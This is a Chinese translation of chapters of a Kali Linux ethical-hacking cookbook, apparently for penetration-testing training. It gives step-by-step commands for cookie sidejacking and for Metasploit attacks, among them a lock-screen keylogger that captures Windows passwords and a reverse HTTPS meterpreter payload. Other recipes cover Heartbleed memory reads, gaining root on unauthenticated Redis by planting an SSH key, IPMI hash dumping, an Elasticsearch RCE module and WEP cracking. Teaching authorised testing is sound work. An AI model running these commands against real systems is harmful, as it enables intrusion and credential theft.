# Kali Linux：道德黑客秘籍（二）

> 原文：[`annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628`](https://annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：当前利用的网络利用

在本章中，我们将涵盖以下教程：

+   仓鼠和雪貂的中间人

+   探索 msfconsole

+   使用偏执的 meterpreter

+   一个流血的故事

+   Redis 利用

+   对 SQL 说不-拥有 MongoDB

+   嵌入式设备黑客

+   Elasticsearch 利用

+   老牌的 Wireshark

+   这就是斯巴达！

# 介绍

利用网络通常是一个很有用的技术。很多时候，我们可能会发现企业中最脆弱的地方就在网络本身。在这个教程中，您将了解一些我们可以对网络进行渗透测试并成功利用我们发现的服务的方法。

# 仓鼠和雪貂的中间人

仓鼠是一个用于侧面劫持的工具。它充当代理服务器，而雪貂用于在网络中嗅探 cookie。在这个教程中，我们将看看如何劫持一些会话！

# 做好准备

Kali 已经预装了这个工具，让我们看看如何运行它！

# 如何做...

仓鼠非常容易使用，也带有用户界面。按照给定的步骤学习仓鼠的使用：

1.  我们开始输入以下命令：

```
 hamster
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/84ca84ea-626b-454a-8d4e-c829c259de0d.png)

1.  现在我们只需要启动浏览器，然后导航到`http://localhost:1234`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ffc498a3-f105-4b08-a3fc-d450c0afacc7.png)

1.  接下来，我们需要点击“适配器”，并选择我们想要监视的接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/438d85ed-ede6-4b91-aa0a-3bdeb68f8b72.png)

1.  我们将等待一会儿，然后在左侧选项卡中看到会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e34a6a9a-b851-494e-be8d-908ec165db03.png)

如果几分钟后您没有看到会话，可能是因为仓鼠和雪貂不在同一个文件夹中。仓鼠在后台运行并执行雪貂。

一些用户可能会遇到问题，因为雪貂不支持 64 位架构。我们需要添加一个 32 位存储库，然后安装雪貂。可以使用以下命令完成：`dpkg --add-architecture i386 && apt-get update && apt-get install ferret-sidejack:i386`。

# 探索 msfconsole

在前几章中，我们已经介绍了 Metasploit 的一些基础知识。在这个教程中，您将学习一些使用 meterpreter 和 Metasploit 进行更有效利用的技术。

# 如何做...

要了解 Metasploit，请按照以下步骤操作：

1.  让我们启动 Metasploit 控制台，输入`msfconsole`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/49d36102-75f5-4aa0-a0cd-3a16ad919f64.png)

1.  要查看可用的利用列表，我们使用以下命令：

```
 show exploits
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/678d5613-cdc8-4126-af86-8ef9a8fbaf7a.png)

1.  同样地，为了查看有效载荷列表，我们使用以下命令：

```
 show payloads
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/efa6ce7e-2479-4a69-91bc-3f98f8c901ca.png)

1.  Metasploit 还配备了数百个辅助模块，其中包含扫描器、模糊器、嗅探器等。要查看辅助模块，我们使用以下命令：

```
 show auxiliary
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6fb68873-824c-47a4-9a0c-29a13345c385.png)

1.  让我们使用以下命令进行 FTP 模糊测试：

```
 use auxiliary/fuzzers/ftp/ftp_client_ftp
```

1.  我们将使用以下命令查看选项：

```
 show options
```

1.  我们使用以下命令设置 RHOSTS：

```
 set RHOSTS  x.x.x.x
```

1.  现在我们运行辅助程序，以便在发生崩溃时通知我们：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e9c74b32-c565-48e2-8032-a7a6d8688434.png)

# Metasploit 中的 Railgun

在这个教程中，我们将更多地了解 Railgun。Railgun 是一个仅限于 Windows 利用的 meterpreter 功能。它允许直接与 Windows API 通信。

# 如何做...

Railgun 允许我们执行 Metasploit 无法执行的许多任务，例如按键等。使用它，我们可以使用 Windows API 调用执行我们需要的所有操作，以获得更好的后期利用：

1.  我们已经在前面的章节中看到了如何获取 meterpreter 会话。我们可以通过输入`irb`命令从 meterpreter 跳转到 Railgun：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bc1c86b5-c9ac-4ffc-8e7b-e4cee7296c0f.png)

1.  要访问 Railgun，我们使用`session.railgun`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2eb334e7-d501-447a-a098-64347432c713.png)

我们看到打印了很多数据。这些基本上是可用的 DLL 和函数。

1.  为了更好地查看 DLL 名称，我们输入以下命令：

```
 session.railgun.known_dll_names
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1b9b3eed-ddd1-4af3-8d3b-895e143e7fd9.png)

1.  要查看`.dll`的函数，我们使用以下命令：

```
 session.railgun.<dllname>.functions
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/885ad8a5-c88a-4fb0-bf99-26adedc1ba83.png)

1.  让我们尝试调用一个 API，它将锁定受害者的屏幕。我们可以通过输入以下命令来实现：

```
 client.railgun.user32.LockWorkStation()
```

我们可以看到我们被锁定了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b2205ea3-0235-4dd9-89f6-445793a460f3.png)

1.  让我们想象一个情况，我们想要获取用户的登录密码。我们有哈希，但我们无法破解它。使用 Railgun，我们可以调用 Windows API 来锁定屏幕，然后在后台运行键盘记录器，这样当用户登录时，我们就会得到密码。Metasploit 已经有一个使用 Railgun 来执行此操作的后渗透模块；让我们试试吧！

我们退出我们的`irb`，将我们的 meterpreter 会话放在后台，然后我们使用模块：

```
 use post/windows/capture/lockout,keylogger
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/81567e10-4788-4ed9-a839-08ed8581484a.png)

1.  我们使用`set session`命令添加我们的会话。

1.  然后，在这里设置`winlogon.exe`的 PID：

```
 set PID <winlogon pid>
```

1.  接下来，我们运行，我们可以看到用户输入的密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/03baa2d4-3f6b-47f4-8df2-e37bd15e2cdf.png)

# 还有更多...

这只是一个我们看到的函数调用的示例。我们可以使用 Railgun 执行许多其他操作，比如删除管理员用户，插入注册表，创建我们自己的 DLL 等等。

有关更多信息，请访问：

[`www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf`](https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf)。

# 使用偏执的 meterpreter

在 2015 年的某个时候，黑客意识到可以通过简单地玩弄受害者的 DNS 并启动自己的处理程序来窃取/劫持某人的 meterpreter 会话。然后，这导致了 meterpreter 偏执模式的开发和发布。他们引入了一个 API，验证了两端由 msf 呈现的证书的 SHA1 哈希。在本教程中，我们将看到如何使用偏执模式。

# 如何做到...

我们需要一个 SSL 证书来开始：

1.  我们可以使用以下命令生成我们自己的：

```
 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509
        -keyout meterpreter.key -out meterpreter.crt
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/47258e16-84a4-43ae-9b07-dbe445ac2b7a.png)

我们填写信息，如国家代码和其他信息：

```
 cat meterpreter.key meterpreter.crt > meterpreter.pem
```

1.  前面的命令基本上打开了两个文件，然后将它们写入一个文件。然后我们使用我们生成的证书来生成一个载荷：

```
 msfvenom -p windows/meterpreter/reverse_winhttps LHOST=IP
        LPORT=443 HandlerSSLCert=meterpreter.pem
        StagerVerifySSLCert=true
        -f exe -o payload.exe
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/32122a12-11f3-44bd-8b56-fd08c8dcb269.png)

1.  要设置选项，我们使用以下命令：

```
 set HandlerSSLCert /path/to/pem_file
 set StagerVerifySSLCert true
```

以下截图显示了前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c3b4519e-19dc-4da5-a558-e96444b47071.png)

1.  现在我们运行我们的处理程序，我们可以看到分段程序验证了与处理程序的连接，然后建立了连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/85e5b7ef-9782-4d6a-a2a5-d5bc75cf0f10.png)

# 还有更多...

我们可以通过在使用`-PayloadUUIDName=`开关生成载荷时提及我们自己的 UUID，将其提升到更高级别。使用这个，即使另一个攻击者可以访问我们的证书，他们也无法劫持我们的会话，因为 UUID 不匹配。

# 一个流血的故事

HeartBleed 是 OpenSSL 密码学中的一个漏洞，据说是在 2012 年引入的，并在 2014 年公开披露。这是一个缓冲区超读漏洞，允许读取的数据比允许的数据更多。

在这个教程中，您将学习如何利用 Metasploit 的辅助模块来利用 HeartBleed。

# 如何做...

要了解 HeartBleed，请按照以下步骤进行：

1.  我们通过输入此命令启动`msfconsole`：

```
 msfconsole
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/418bd92c-2e74-4825-840d-52fb69e3fa5f.png)

1.  然后，我们使用以下命令搜索 HeartBleed 辅助工具：

```
 search heartbleed
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/139b4243-4ce8-4290-befb-6b0d03d70c76.png)

1.  接下来，我们使用以下命令使用辅助工具：

```
 use auxiliary/scanner/ssl/openssl_heartbleed
```

1.  然后我们使用以下命令查看选项：

```
 show options
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f7e03e17-9728-45c3-81b7-160c9ea9d3ff.png)

1.  现在我们使用以下命令将 RHOSTS 设置为我们的目标 IP：

```
 set RHOSTS x.x.x.x
```

1.  然后，我们使用此命令将详细程度设置为`true`：

```
 set verbose true
```

1.  然后我们输入`run`，现在我们应该看到数据。这些数据通常包含敏感信息，如密码、电子邮件 ID 等：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0eb13fbb-7033-4103-a09c-193f517d8002.png)

# Redis 利用

有时在渗透测试时，我们可能会遇到无意间留下的公共 Redis 安装。在未经身份验证的 Redis 安装中，最简单的事情就是写入随机文件。在这个教程中，我们将看到如何获取运行时没有身份验证的 Redis 安装的根访问权限。

# 如何做...

要了解 Redis 的利用，请按照以下步骤进行：

1.  我们首先 telnet 到服务器，检查是否可能建立成功的连接：

```
 telnet x.x.x.x 6379
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9e6c77ec-1206-4ea5-882e-4acc7e153b05.png)

1.  然后我们终止 telnet 会话。接下来，我们使用以下命令生成我们的 SSH 密钥：

```
 ssh-keygen -t rsa -C youremail@example.com
```

1.  然后，我们输入要保存的文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/36425f75-6adc-478f-b7ce-41cc503dc2e9.png)

1.  我们的密钥已生成；现在我们需要将它写入服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/934bceb2-7871-4207-9b28-b4bbf292d489.png)

1.  我们需要安装`redis-cli`；我们可以使用以下命令：

```
 sudo apt-get install redis-tools
```

1.  安装完成后，我们回到我们生成的密钥，并在我们的密钥之前和之后添加一些随机数据：

```
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

`key.txt`文件是我们的新密钥文件，带有新行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/88999e5d-3ca6-4818-af5d-7e158d80ca34.png)

1.  现在我们需要用我们自己的密钥替换数据库中的密钥。所以我们使用这个命令连接到主机：

```
 redis-cli -h x.x.x.x
```

1.  接下来，我们使用以下命令刷新密钥：

```
        redis-cli -h x.x.x.x -p 6350 flushall
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4295471a-f644-4fad-9609-d21871207957.png)

1.  现在我们需要将我们的密钥设置到数据库中。我们使用以下命令来做到这一点：

```
 cat redis.txt | redis-cli –h x.x.x.x –p 6451 -x set bb 
```

1.  完成后，我们需要将上传的密钥复制到`.ssh`文件夹中；首先，我们使用此命令检查当前文件夹：

```
 config get dir
```

1.  现在我们将目录更改为`/root/.ssh/`：

```
 config set dir /root/.ssh/
```

1.  接下来，我们使用`set dbfilename "authorized_keys"`更改文件名，并使用 save 保存：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d51ca411-9c87-425f-9554-7aaee650b238.png)

1.  现在让我们尝试 SSH 进入服务器。我们看到我们是 root：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/357de6a7-6de2-4497-aedd-e74605c16b42.png)

# 对 SQL 说不-拥有 MongoDB

MongoDB 是一个免费的开源跨平台数据库程序。它使用类似 JSON 的带模式的文档。MongoDB 的默认安全配置允许任何人在未经身份验证的情况下访问数据。在这个教程中，我们将看到如何利用这个漏洞。

# 准备工作

MongoDB 默认在端口`27017`上运行。要访问 MongoDB，我们需要下载并安装 MongoDB 客户端。有多个客户端可用；我们将使用 Studio-3T，可以从[`studio3t.com/.`](https://studio3t.com/.)下载。

# 如何做...

按照以下步骤学习：

1.  安装完成后，我们打开应用程序并选择连接。

1.  在打开的窗口中，我们点击新连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/17ae78a6-1aa6-4130-b9c4-37a6f5545aa4.png)

1.  然后，我们选择一个名称，在服务器字段中输入 IP 地址，然后单击保存：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/52445b70-ff53-4b33-bff9-14793913546f.png)

1.  接下来，我们只需从列表中选择我们刚刚添加的数据库，然后单击连接。成功连接后，数据库名称将显示在左侧，数据将显示在右侧。

# 嵌入式设备黑客

**智能平台管理接口**（**IPMI**）是一种技术，可以让管理员几乎完全控制远程部署的服务器。

在渗透测试时，IPMI 可能在大多数公司中找到。在这个示例中，我们将看到如何发现 IPMI 设备中的漏洞。

# 如何做...

要了解 IPMI，请按照给定的步骤进行：

1.  我们启动 Metasploit：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/89ec1852-72a6-4e10-b981-13753059e833.png)

1.  我们使用以下命令搜索与 IPMI 相关的利用：

```
 search ipmi
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ca314fdd-e1fb-4a64-bfcb-b6f148c213d5.png)

1.  我们将使用**IPMI 2.0 RAKP 远程 SHA1 密码哈希检索**漏洞；我们选择辅助工具。还有多个利用，例如 CIPHER Zero，也可以尝试：

```
 use auxiliary/scanner/ipmi/ipmi_dumphashes
```

1.  接下来，为了查看选项，我们输入以下内容：

```
 show options
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/545897e6-3e20-455a-b27b-e5cdaf5e415f.png)

1.  在这里，我们看到辅助工具自动尝试破解检索到的哈希。

我们设置 RHOSTS 并运行。成功利用后，我们将看到检索和破解的哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bf45e540-99e6-41f4-8226-152e62249f35.png)

# Elasticsearch 利用

有时在进行渗透测试时，我们可能还会遇到一些在各种端口号上运行的服务。我们将在这个示例中介绍这样的服务。Elasticsearch 是一个基于 Java 的开源搜索企业引擎。它可以用于实时搜索任何类型的文档。

2015 年，Elasticsearch 出现了一个 RCE 利用漏洞，允许黑客绕过沙箱并执行远程命令。让我们看看如何做到这一点。

# 如何做...

以下步骤演示了 Elasticsearch 的利用：

1.  Elasticsearch 的默认端口是`9200`。我们启动 Metasploit 控制台：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/58d6bd05-740c-44a9-98d6-924790c7fd12.png)

1.  我们使用以下命令搜索 Elasticsearch 利用漏洞：

```
 search elasticsearch
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/54184f66-0f2f-4617-a49e-cb4a3c09cc19.png)

1.  我们在这种情况下选择利用：

```
 use exploit/multi/elasticsearch/search_groovy_script
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d9555910-c534-433c-b376-1989c20ed3b2.png)

1.  我们使用`set RHOST x.x.x.x`命令设置 RHOST：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/23726177-ae46-4a05-99fb-575043e5b4b9.png)

1.  我们运行以下命令：

```
 run
```

1.  我们的 meterpreter 会话已准备就绪。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/791bec9c-03e1-426c-918f-7a6590cd7e0d.png)

# 另请参阅

+   *探索 msfconsole*示例

# 老牌的 Wireshark

Wireshark 是世界上最常用的网络协议分析器。它是免费和开源的。它主要用于网络故障排除和分析。在这个示例中，您将学习一些关于 Wireshark 的基本知识，以及我们如何使用它来分析网络流量，以找出实际通过我们的网络流动的信息。

# 准备好

Kali 已经预先安装了该工具，让我们看看如何运行它！

# 如何做...

以下步骤演示了 Wireshark 的使用：

1.  可以使用`Wireshark`命令打开 Wireshark：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/80ce21ad-4148-4b21-b673-78f1f6cdc9f1.png)

1.  我们选择要捕获流量的接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/54139aee-2daf-43e7-883f-0d2113371bab.png)

1.  然后，我们单击开始。显示过滤器用于在捕获网络流量时查看一般的数据包过滤。例如：`tcp.port eq 80` 如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/163777db-362f-4319-a7b2-222ae7c17940.png)

1.  应用过滤器将仅显示端口`80`上的流量。如果我们只想查看来自特定 IP 的请求，我们选择该请求，然后右键单击它。

1.  然后，我们导航到“应用为过滤器|已选择”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b64c9bc9-e8e8-42ee-a557-d340aaba67f6.png)

1.  然后我们看到过滤器已经应用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a07fff97-52ab-4da3-9cf8-5a8d00df73b5.png)

1.  有时，我们可能想要查看两个主机之间在 TCP 级别发生的通信。跟踪 TCP 流是一个功能，它允许我们查看从 A 到 B 和从 B 到 A 的所有流量。让我们尝试使用它。从菜单中，我们选择 Statistics，然后点击 Conversations：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9c7f87ea-1bbe-46dc-b054-5129fe7f7243.png)

1.  在打开的窗口中，我们切换到 TCP 选项卡。在这里，我们可以看到 IP 列表以及它们之间传输的数据包。要查看 TCP 流，我们选择其中一个 IP，然后点击 Follow Stream：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/cd43fa4b-ca7b-434f-bdb9-6ec616844b78.png)

1.  在这里，我们可以看到通过 TCP 传输的数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c78b85c0-6f77-48d9-a06b-86086ce2a808.png)

1.  捕获过滤器用于捕获特定于所应用过滤器的流量；例如，如果我们只想捕获来自特定主机的数据，我们使用主机`x.x.x.x`。

1.  要应用捕获过滤器，我们点击 Capture Options，在打开的新窗口中，我们将看到一个名为 Capture Options 的字段。在这里，我们可以输入我们的过滤器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d7d53535-96c7-4fbc-be0f-9b59689ffe44.png)

1.  假设我们正在调查网络中对 HeartBleed 的利用。我们可以使用以下捕获过滤器来确定是否已利用 HeartBleed：

```
 tcp src port 443 and (tcp[((tcp[12] & 0xF0) >> 4 ) * 4] = 0x18)
        and (tcp[((tcp[12] & 0xF0) >> 4 ) * 4 + 1] = 0x03) and
        (tcp[((tcp[12] & 0xF0) >> 4 ) * 4 + 2] < 0x04) and
        ((ip[2:2] - 4 * (ip[0] & 0x0F) - 4 * ((tcp[12] & 0xF0) >> 4) > 69))
```

# 还有更多...

以下是一些有用的链接，它们包含了 Wireshark 中所有过滤器的列表。在进行深入的数据包分析时，这些过滤器可能会派上用场：

+   [`wiki.wireshark.org/CaptureFilters`](https://wiki.wireshark.org/CaptureFilters)

+   [`wiki.wireshark.org/FrontPage`](https://wiki.wireshark.org/FrontPage)

# 这就是斯巴达！

Sparta 是一个基于 GUI 的 Python 工具，对基础设施进行渗透测试非常有用。它有助于扫描和枚举。我们甚至可以在这里导入 nmap 输出。Sparta 非常易于使用，自动化了许多信息收集工作，并使整个过程更加简单。在这个教程中，您将学习如何使用该工具对网络进行各种扫描。

# 准备就绪

Kali 已经预先安装了该工具，所以让我们看看如何运行它！

# 如何做...

要了解有关 Sparta 的更多信息，请按照给定的步骤操作：

1.  我们首先输入`Sparta`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/572bedca-bb84-41e1-83e8-4fb0e1c2fa33.png)

我们将看到工具打开。

1.  现在我们点击菜单窗格的左侧以添加主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ae36e042-bb69-4ec8-8cb8-8fe054f31912.png)

1.  在窗口中，我们输入要扫描的 IP 范围。

1.  一旦我们点击 Add to scope，它会自动开始运行 nmap、nikto 等基本过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/841bd643-410c-40c1-95c3-de9a34df3aa4.png)

1.  我们可以在左侧窗格上看到发现的主机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9d0ea924-213d-4530-83a0-762c5c49992a.png)

1.  在右侧的 Services 选项卡中，我们将看到开放的端口以及它们正在运行的服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/89363857-5ff6-48dd-bd29-0e3b06c1e3ff.png)

1.  切换到 Nikto 选项卡，我们将看到为我们选择的主机显示的 Nikto 输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3c8620d0-9ab3-46b2-94b7-e43de88aeb2d.png)

1.  我们还可以看到在主机上运行端口`80`的页面的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0ddf5a01-5454-43dc-8e6d-6a9553ae86b4.png)

1.  对于诸如 FTP 之类的服务，它会自动运行诸如 Hydra 之类的工具来暴力破解登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e65abbdf-3386-4d0a-924a-38334df22079.png)

1.  在左侧窗格上，切换到 Tools 选项卡，我们可以看到每个主机的输出。

1.  我们还可以通过切换到 Brute 选项卡来执行自定义暴力破解攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/879c7156-94ed-4f52-9e47-411dd2a0f6f6.png)

1.  要运行完整的端口扫描或独角兽扫描，我们可以右键单击主机。转到 Portscan 菜单，然后选择我们要在主机上运行的扫描类型：

抱歉，我无法识别图片中的文本。


# 第六章：无线攻击-超越 Aircrack-ng

在本章中，我们将涵盖以下内容：

+   老牌 Aircrack

+   与 Gerix 一起

+   处理 WPAs

+   使用 Ghost Phisher 拥有员工帐户

+   Pixie dust 攻击

# 介绍

如官方网站上所述：

“Aircrack-ng 是一个完整的工具套件，用于评估 Wi-Fi 网络安全性。

它专注于 Wi-Fi 安全的不同领域：

+   *监控：数据包捕获和将数据导出到文本文件，以便第三方工具进一步处理*

+   *攻击：重放攻击，去认证，伪造接入点和其他通过数据包注入*

+   *测试：检查 Wi-Fi 卡和驱动程序功能（捕获和注入）*

+   *破解：WEP 和 WPA PSK（WPA 1 和 2）*

# 老牌 Aircrack

Aircrack 是一个用于网络的软件套件，包括网络探测器，数据包嗅探器和 WEP/WPA2 破解器。它是开源的，专为 802.11 无线局域网设计（有关更多信息，请访问[`en.wikipedia.org/wiki/IEEE_802.11`](https://en.wikipedia.org/wiki/IEEE_802.11)）。它包括各种工具，如`aircrack-ng`，`airmon-ng`，`airdecap`，`aireplay-ng`，`packetforge-ng`等。

在这个示例中，我们将涵盖使用 Aircrack 套件破解无线网络的一些基础知识。您将学习使用`airmon-ng`，`aircrack-ng`，`airodump-ng`等工具来破解我们周围无线网络的密码。

# 准备就绪

我们需要有一个支持数据包注入的 Wi-Fi 硬件。 Alfa Networks 的 Alfa 卡，TP-Link TL-WN821N 和 EDIMAX EW-7811UTC AC600 是我们可以使用的一些卡。在这个例子中，我们使用 Alfa 卡。

# 如何做...

以下步骤演示了 Aircrack：

1.  我们输入`airmon-ng`命令，以检查我们的卡是否被 Kali 检测到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4ba756bd-221c-4e3e-8d93-90e01b3ca948.png)

1.  接下来，我们需要使用以下命令将我们的适配器设置为监视模式：

```
 airmon-ng start wlan0mon 
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/83c25089-ab96-4ed4-8159-abe046621744.png)

1.  现在，为了查看附近运行的路由器，我们使用以下命令：

```
 airodump-ng wlan0mon
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5741911a-9894-42e4-9926-73e2911af7ed.png)

1.  在这里，我们注意到我们想要破解的网络的`BSSID`；在我们的例子中，它是`B8:C1:A2:07:BC:F1`，频道号是`9`。我们通过按*Ctrl* + *C*停止该过程，并保持窗口打开。

1.  现在我们使用`airodump-ng`捕获数据包，并使用`-w`开关将这些数据包写入文件：

```
 airodump-ng -w packets -c 9 --bssid B8:C1:A2:07:BC:F1 wlan0mon
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/728e79cd-1cb3-4407-bfd9-5d5bf20806bc.png)

1.  现在我们需要观察信标和数据列；这些数字从`0`开始，并随着数据包在路由器和其他设备之间传递而增加。我们至少需要 20,000 个初始化向量才能成功破解**有线等效隐私**（**WEP**）密码：

1.  为了加快进程，我们打开另一个终端窗口并运行`aireplay-ng`，并使用以下命令执行伪身份验证：

```
 aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <OUR MAC> wlan0mon 
       {fake authentication}
```

以下屏幕截图显示了前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6d610a66-b5fb-4a61-8029-48b325d8517e.png)

1.  现在让我们使用以下命令进行 ARP 数据包重放：

```
 aireplay-ng -3 -b BSSID wlan0mon
```

以下屏幕截图显示了前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/89ef9aa4-2a73-40af-91da-e77be873bada.png)

1.  一旦我们有足够的数据包，我们就开始`aircrack-ng`，并提供我们保存数据包的文件名：

```
 aircrack-ng filename.cap
```

以下屏幕截图显示了前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/85b13ebc-b4d7-4cf4-b57e-a5c651b51cf3.png)

1.  一旦破解，我们应该在屏幕上看到密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/598ceb35-cdf3-4d03-aa38-8e42eee9f958.png)

# 它是如何工作的...

这种攻击的思想是尽可能多地捕获数据包。每个数据包包含一个**初始化向量**（**IV**），其大小为 3 个字节，并与之关联。我们只需捕获尽可能多的 IV，然后在其上使用 Aircrack 来获取我们的密码。

# 与 Gerix 一起

